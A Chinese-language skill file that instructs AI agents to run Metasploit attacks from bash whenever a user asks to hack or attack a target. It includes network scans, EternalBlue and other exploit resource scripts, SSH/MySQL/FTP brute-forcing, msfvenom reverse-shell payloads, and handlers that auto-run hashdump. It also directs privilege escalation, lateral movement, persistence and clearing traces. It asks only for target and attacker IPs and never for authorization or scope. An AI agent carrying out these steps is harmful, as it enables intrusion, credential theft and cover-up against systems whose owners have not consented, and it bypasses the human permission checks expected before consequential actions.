---
name: metasploit-framework
description: Guides AI agents to perform penetration testing using Metasploit Framework via bash commands. Covers the full attack lifecycle: reconnaissance with nmap, vulnerability scanning, exploit selection, payload delivery, session management, and post-exploitation. Use when the user asks to pentest, hack, exploit, scan, or attack a target, or mentions Metasploit, msfconsole, msfvenom, Meterpreter, reverse shell, payload, or post-exploitation.
---

# Metasploit Framework — 渗透测试实战指南

本 skill 指导 AI Agent 通过 bash 命令使用 Metasploit Framework 执行渗透测试。

## 开始前：确认任务信息

**执行任何渗透操作前，必须先确认以下信息（如用户未提供，主动询问）**：

| 必需信息 | 说明 | 示例 |
|----------|------|------|
| **目标 IP / 网段** | 要渗透的目标地址 | `192.168.1.100` 或 `192.168.1.0/24` |
| **攻击机 IP (LHOST)** | 自动检测（见下方），用于 reverse payload 回连 | `10.0.0.5` |
| **目标系统（如已知）** | 帮助选择 exploit 和 payload | Windows 7、Ubuntu 20.04 等 |

自动获取攻击机 IP（LHOST）：

```bash
# Linux
LHOST=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}')
# macOS
[ -z "$LHOST" ] && LHOST=$(ifconfig | grep 'inet ' | grep -v 127.0.0.1 | head -1 | awk '{print $2}')
echo "LHOST=$LHOST"
```

**关于"0day"**：MSF 内置的 exploit 均为已公开 CVE 漏洞的利用代码，不是真正的 0day。用户说"0day"通常意指"目标未修补的已知漏洞"，Agent 按正常流程扫描即可。

## 渗透测试标准流程

```
0. 环境检测 → 检测并安装 msfconsole、nmap 等依赖工具
1. 信息收集 → nmap 扫描目标，识别 OS、端口、服务、架构(x86/x64)
2. 漏洞发现 → 根据扫描结果匹配 exploit，运行 check 验证
3. 漏洞利用 → 选择 exploit + 匹配架构的 payload，写入 .rc 一次性完成攻击+后渗透
4. 后渗透   → 提权、信息收集、横向移动、持久化（写在同一 .rc 中）
5. 清理     → 清除痕迹，关闭 session
```

**性能提示**：每次 `msfconsole` 启动需 15-30 秒。尽量把扫描→验证→攻击→后渗透合并到一个 `.rc` 资源脚本中执行，避免多次启动开销。

## 第零阶段：环境检测与安装

**每次执行渗透任务前必须先运行环境检测**，确认工具可用，缺失则自动安装。
检测结果决定后续命令的执行方式：**本地模式** 或 **Docker 模式**。

### 第一步：检测 MSF 运行环境

**重要：以下所有检测命令必须在同一个 shell session 中执行，变量才能跨步骤保持。**

```bash
export MSF_MODE="missing"
export MSF_CONTAINER=""

# 1) 检测本地是否有 msfconsole（只检测二进制存在，不运行 --version 因为加载框架要 30s+）
if command -v msfconsole &>/dev/null; then
  MSF_MODE="local"
  echo "[+] MSF 环境: 本地安装 ($(which msfconsole))"

# 2) 检测是否有正在运行的 MSF Docker 容器
elif docker ps --format '{{.Names}} {{.Image}}' 2>/dev/null | grep -qi metasploit; then
  MSF_MODE="docker"
  MSF_CONTAINER=$(docker ps --format '{{.Names}} {{.Image}}' 2>/dev/null | grep -i metasploit | head -1 | awk '{print $1}')
  echo "[+] MSF 环境: Docker 容器 ($MSF_CONTAINER)"

# 3) 检测是否有已停止的 MSF 容器（可启动）
elif docker ps -a --format '{{.Names}} {{.Image}}' 2>/dev/null | grep -qi metasploit; then
  MSF_MODE="docker-stopped"
  MSF_CONTAINER=$(docker ps -a --format '{{.Names}} {{.Image}}' 2>/dev/null | grep -i metasploit | head -1 | awk '{print $1}')
  echo "[!] MSF 环境: Docker 容器已停止 ($MSF_CONTAINER)，需要启动"

# 4) 检测 Docker 是否可用（可以拉取镜像）
elif command -v docker &>/dev/null; then
  MSF_MODE="docker-available"
  echo "[!] MSF 环境: 未安装本地 MSF，但 Docker 可用，可拉取镜像"

else
  echo "[-] MSF 环境: 未检测到 msfconsole 或 Docker"
fi

export MSF_MODE MSF_CONTAINER
echo "MSF_MODE=$MSF_MODE MSF_CONTAINER=$MSF_CONTAINER"
```

### 第二步：检测其他工具

```bash
for cmd in nmap curl wget searchsploit; do
  if command -v $cmd &>/dev/null; then
    echo "[+] $cmd: $(which $cmd)"
  else
    echo "[-] $cmd: 未安装"
  fi
done
```

### 第三步：根据检测结果安装/启动

#### 情况 A：本地已安装（MSF_MODE=local）

无需额外操作，直接使用。

#### 情况 B：Docker 容器运行中（MSF_MODE=docker）

无需额外操作，后续命令通过 `docker exec` 执行。

#### 情况 C：Docker 容器已停止（MSF_MODE=docker-stopped）

```bash
docker start $MSF_CONTAINER
sleep 3  # 等待 postgresql 启动
docker exec $MSF_CONTAINER service postgresql status || docker exec $MSF_CONTAINER service postgresql start
```

#### 情况 D：有 Docker 但无 MSF 镜像（MSF_MODE=docker-available）

```bash
docker pull metasploitframework/metasploit-framework

# 启动持久化容器（挂载数据卷 + 共享宿主机网络）
# 用 bash -c 启动 postgresql + 保持容器运行，不要用 tail -f /dev/null 覆盖入口点
docker run -d \
  --name msf \
  --network host \
  -v msf-data:/root/.msf4 \
  -v /tmp/msf-loot:/loot \
  metasploitframework/metasploit-framework \
  bash -c "service postgresql start; msfdb init; tail -f /dev/null"

export MSF_CONTAINER="msf"

# 等待容器就绪（postgresql 启动需几秒）
sleep 5
docker exec $MSF_CONTAINER msfconsole -q -x "db_status; exit"
```

`--network host` 让容器共享宿主机网络，reverse_tcp 监听和内网扫描才能正常工作。
macOS/Windows Docker Desktop 不支持 host 网络模式，改用端口映射：

```bash
docker run -d \
  --name msf \
  -p 4444-4450:4444-4450 \
  -p 8080-8085:8080-8085 \
  -v msf-data:/root/.msf4 \
  -v /tmp/msf-loot:/loot \
  metasploitframework/metasploit-framework \
  bash -c "service postgresql start; msfdb init; tail -f /dev/null"
```

#### 情况 E：都没有（MSF_MODE=missing）

本地安装 MSF：

```bash
# 方法一：官方一键安装脚本（推荐，Linux / macOS）
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
chmod +x /tmp/msfinstall && /tmp/msfinstall

# 方法二：Kali Linux（已预装，确保更新）
sudo apt update && sudo apt install -y metasploit-framework

# 方法三：macOS (Homebrew)
brew install metasploit

# Windows：从 https://windows.metasploit.com/ 下载
```

### 安装 Nmap 及辅助工具（如缺失）

```bash
# Debian/Ubuntu/Kali
sudo apt update && sudo apt install -y nmap curl wget exploitdb proxychains4 john hashcat

# CentOS/Fedora
sudo dnf install -y nmap curl wget

# macOS
brew install nmap

# Docker 容器内缺 nmap 时（官方镜像基于 Debian，有 apt）
docker exec $MSF_CONTAINER bash -c "apt-get update && apt-get install -y nmap"
```

---

## Agent 执行模型（非交互式）

**Agent 不能与 msfconsole 交互式对话**，所有操作必须通过以下三种模式执行：

### 模式一：`-x` 一次性命令（适合扫描、搜索、单步操作）

```bash
msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run; exit"
```

### 模式二：资源脚本 `.rc`（适合多步操作、exploit + 后渗透）

```bash
cat > /tmp/attack.rc << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <你的IP>
set LPORT 4444
exploit -z
sleep 5
sessions -C "sysinfo" -i 1
sessions -C "hashdump" -i 1
EOF
msfconsole -q -r /tmp/attack.rc
```

**关键参数**：

- **`exploit -z`**：exploit 成功后自动将 session 放入后台，msfconsole 继续执行后续命令
- **`sessions -C "cmd" -i <id>`**：向指定 session 发送 Meterpreter 命令并返回结果
- 资源脚本结束后 msfconsole 自动退出，**session 随之关闭**——所以所有后渗透操作必须写在同一个 `.rc` 文件中

### 模式三：后台长期运行（适合 handler 监听回连）

```bash
cat > /tmp/handler.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
set AutoRunScript "multi_console_command -r /tmp/post_auto.rc"
exploit
EOF
nohup msfconsole -q -r /tmp/handler.rc > /tmp/handler.log 2>&1 &
echo "Handler PID: $!"
```

`exploit` 不带 `-j`，msfconsole 阻塞等待连接不会退出。`AutoRunScript` 在 session 建立时自动执行后渗透命令。

### Docker 模式对照

| 操作 | 本地模式 | Docker 模式 |
|------|---------|------------|
| `-x` 命令 | `msfconsole -q -x "..."` | `docker exec $MSF_CONTAINER msfconsole -q -x "..."` |
| 资源脚本 | `msfconsole -q -r /tmp/a.rc` | 写入 `/tmp/msf-loot/a.rc` → `docker exec $MSF_CONTAINER msfconsole -q -r /loot/a.rc` |
| payload 生成 | `msfvenom ... -o /tmp/shell.exe` | `docker exec $MSF_CONTAINER msfvenom ... -o /loot/shell.exe`（宿主机 `/tmp/msf-loot/`）|
| nmap 扫描 | `-x` 内用 `db_nmap` | 宿主机 `nmap -oX /tmp/msf-loot/s.xml` → `-x "db_import /loot/s.xml"` |

Docker `--network host` 时网络与宿主机一致，`db_nmap` 可直接扫描。否则 nmap 在宿主机执行后导入。

---

## 前置准备（环境检测通过后）

### 初始化数据库

```bash
# 本地
msfdb init

# Docker
docker exec $MSF_CONTAINER msfdb init
```

### 验证

```bash
# 本地
msfconsole -q -x "db_status; exit"

# Docker
docker exec $MSF_CONTAINER msfconsole -q -x "db_status; exit"
# 应输出: [*] Connected to msf. Connection type: postgresql.
```

如果 `db_status` 未连接（本地模式）：

```bash
sudo systemctl start postgresql    # Linux systemd
sudo service postgresql start      # Linux SysV
brew services start postgresql     # macOS
msfdb reinit
```

## 第一阶段：信息收集

### nmap 扫描（db_nmap 结果自动入库）

```bash
msfconsole -q -x "db_nmap -sn 192.168.1.0/24; hosts; exit"
msfconsole -q -x "db_nmap -sV -O -A 192.168.1.100; services; exit"
msfconsole -q -x "db_nmap --script vuln 192.168.1.100; vulns; exit"
msfconsole -q -x 'db_nmap --script "smb-vuln*" -p 445 192.168.1.100; vulns; exit'
```

批量扫描用资源脚本更高效（一次加载 msfconsole，省去多次启动开销）：

```bash
cat > /tmp/recon.rc << 'EOF'
db_nmap -sV -O -A 192.168.1.0/24
db_nmap --script vuln 192.168.1.0/24
hosts
services
vulns
EOF
msfconsole -q -r /tmp/recon.rc
```

### MSF 辅助扫描模块

```bash
msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run; exit"
msfconsole -q -x "use auxiliary/scanner/http/title; set RHOSTS 192.168.1.0/24; set RPORT 80; run; exit"
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_version; set RHOSTS 192.168.1.0/24; run; exit"
msfconsole -q -x "use auxiliary/scanner/ftp/anonymous; set RHOSTS 192.168.1.0/24; run; exit"
```

## 第二阶段：漏洞发现与利用

### 从扫描结果→选择 exploit 的决策逻辑

根据 nmap 输出中的 **开放端口 + 服务版本 + OS 版本** 匹配 exploit：

| nmap 发现 | 推荐操作 |
|-----------|---------|
| Win7/2008 + port 445 SMB | `search ms17_010` → EternalBlue |
| Windows + port 445 + 有凭据 | `exploit/windows/smb/psexec` |
| port 22 SSH | `auxiliary/scanner/ssh/ssh_login`（暴破）|
| port 8080 Tomcat | `auxiliary/scanner/http/tomcat_mgr_default_creds` → `tomcat_mgr_upload` |
| port 6379 Redis | `auxiliary/scanner/redis/redis_server` → `redis_replication_cmd_exec` |
| port 3306 MySQL | `auxiliary/scanner/mysql/mysql_login`（暴破）→ `mysql_udf_payload` |
| port 1433 MSSQL | `auxiliary/scanner/mssql/mssql_login`（暴破）→ `mssql_payload` |
| Web 应用 | 手动识别框架(Struts/PHP等) → 搜索对应 exploit |
| 未匹配已知场景 | `msfconsole -q -x "search type:exploit platform:<os> <关键词>; exit"` |

### 搜索 + 验证 + 攻击（推荐合并到一个 .rc 减少启动开销）

```bash
# 1. 单独搜索（快速查看有哪些可用 exploit）
msfconsole -q -x "search type:exploit platform:windows smb; exit"
```

### x86 vs x64 架构判断

nmap `-O` 输出中如果显示 "x86" 或 "32-bit"，必须使用 x86 payload。

| nmap OS 探测结果 | Payload 前缀 |
|-----------------|-------------|
| Windows x64 / 64-bit | `windows/x64/meterpreter/reverse_tcp` |
| Windows x86 / 32-bit | `windows/meterpreter/reverse_tcp` |
| 不确定 | 优先用 x64，失败后换 x86 重试 |

### 完整攻击流程（一个 .rc 搞定）

```bash
cat > /tmp/attack.rc << 'EOF'
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.100
run
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT 4444
exploit -z
sleep 5
sessions -C "sysinfo" -i 1
sessions -C "getuid" -i 1
sessions -C "hashdump" -i 1
EOF
msfconsole -q -r /tmp/attack.rc
```

### 失败处理

- **check 输出 `not vulnerable`**：该漏洞不可用，换下一个 exploit 或用 `search` 找替代
- **exploit 执行后无 session**：检查 LHOST/LPORT 是否正确、防火墙是否放行、payload 架构是否匹配（x86 vs x64）
- **session 秒断**：目标杀软拦截了 payload，尝试 `reverse_https` 或 stageless payload

### Payload 选择指南

| 目标系统 | 推荐 Payload | 说明 |
|----------|-------------|------|
| Windows x64 | `windows/x64/meterpreter/reverse_tcp` | 首选，功能最全 |
| Windows x86 | `windows/meterpreter/reverse_tcp` | 32位系统 |
| Linux x64 | `linux/x64/meterpreter/reverse_tcp` | Linux 首选 |
| Linux (轻量) | `cmd/unix/reverse_bash` | 无需 Meterpreter |
| PHP 应用 | `php/meterpreter/reverse_tcp` | Web 应用 |
| Java 应用 | `java/meterpreter/reverse_tcp` | Tomcat/JBoss 等 |
| Python 环境 | `python/meterpreter/reverse_tcp` | Python 可用时 |

**reverse_tcp vs bind_tcp**：目标能出网用 `reverse_tcp`（目标连回你），不能出网用 `bind_tcp`（你连过去）。有防火墙时尝试 `reverse_https`。

## 第三阶段：后渗透

**后渗透必须追加在 exploit 的同一个 `.rc` 资源脚本中**（msfconsole 退出则 session 丢失）。

在上述 `attack.rc` 的 `exploit -z` 和 `sleep 5` 之后追加：

```
sessions -C "sysinfo" -i 1
sessions -C "getsystem" -i 1
sessions -C "hashdump" -i 1
sessions -C "screenshot" -i 1
sessions -C "run autoroute -s 10.0.0.0/24" -i 1
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

完整命令速查 → [post-exploitation.md](post-exploitation.md)

## 常用 msfvenom 命令

```bash
# Windows EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<你的IP> LPORT=4444 -f exe -o shell.exe
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<你的IP> LPORT=4444 -f elf -o shell
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=<你的IP> LPORT=4444 -f raw -o shell.php
```

更多格式见 [msfvenom-cheatsheet.md](msfvenom-cheatsheet.md)。

生成后需启动 handler 监听（后台长期运行，等待目标回连）：

```bash
cat > /tmp/post_auto.rc << 'EOF'
sysinfo
getuid
hashdump
EOF

cat > /tmp/handler.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
set AutoRunScript "multi_console_command -r /tmp/post_auto.rc"
exploit
EOF
nohup msfconsole -q -r /tmp/handler.rc > /tmp/handler.log 2>&1 &
echo "Handler PID: $! — 查看日志: tail -f /tmp/handler.log"
```

`exploit` 不带 `-j` 使 msfconsole 阻塞等待，不会退出。`AutoRunScript` 在收到 session 时自动执行后渗透。

## 常见渗透场景速查

详细步骤见 [pentest-workflows.md](pentest-workflows.md)。

| 场景 | Exploit | 说明 |
|------|---------|------|
| Windows 7/2008 SMB | `exploit/windows/smb/ms17_010_eternalblue` | 永恒之蓝 |
| Windows SMB 通用 | `exploit/windows/smb/psexec` | 需要凭据 |
| Tomcat 管理器 | `exploit/multi/http/tomcat_mgr_upload` | 需要凭据 |
| Apache Struts | `exploit/multi/http/struts2_content_type_ognl` | RCE |
| Redis 未授权 | `exploit/linux/redis/redis_replication_cmd_exec` | 未授权 |
| MySQL UDF | `exploit/multi/mysql/mysql_udf_payload` | 需要凭据 |
| SSH 暴力破解 | `auxiliary/scanner/ssh/ssh_login` | 需要字典 |
| FTP 暴力破解 | `auxiliary/scanner/ftp/ftp_login` | 需要字典 |
| HTTP 基础认证破解 | `auxiliary/scanner/http/http_login` | 需要字典 |
| VNC 无密码检测 | `auxiliary/scanner/vnc/vnc_none_auth` | 直接访问 |
| MS-SQL 暴破 | `auxiliary/scanner/mssql/mssql_login` | 需要字典 |

## 资源脚本编写要点

```
exploit -z              # 必须带 -z，成功后 session 进后台，继续执行下一行
sleep 5                 # exploit 后给 session 建立时间
sessions -C "cmd" -i 1  # 向 session 1 发送 Meterpreter 命令（大写 -C）
sessions -c "cmd" -i 1  # 向 session 1 发送系统 shell 命令（小写 -c）
```

**推荐把 recon → check → exploit → post 全部写入一个 `.rc`**，避免多次启动 msfconsole。见第二阶段的"完整攻击流程"示例。

## 关键提示

- **先 check 后 exploit**：避免打崩目标服务
- **优先选高 Rank 的 exploit**：excellent > great > good
- **reverse_tcp 要确保目标能访问你的 IP**：内网用内网IP，外网需端口转发或用 ngrok
- **多个目标时用 RHOSTS 范围**：`set RHOSTS 192.168.1.1-254` 或 `set RHOSTS file:/tmp/targets.txt`
- **session 生命周期**：session 绑定 msfconsole 进程，进程退出 = session 丢失。所有需要 session 的操作必须在同一个 `.rc` 或 `-x` 中完成
- **导入外部扫描**：`db_import /path/to/nmap.xml` 导入 nmap/Nessus 结果
- **数据库持久化**：`hosts`、`services`、`vulns`、`creds` 数据保存在数据库中，跨 msfconsole 重启可用

## 更多参考

- 渗透场景完整步骤 → [pentest-workflows.md](pentest-workflows.md)
- msfvenom 完整速查 → [msfvenom-cheatsheet.md](msfvenom-cheatsheet.md)
- 后渗透操作完整命令 → [post-exploitation.md](post-exploitation.md)
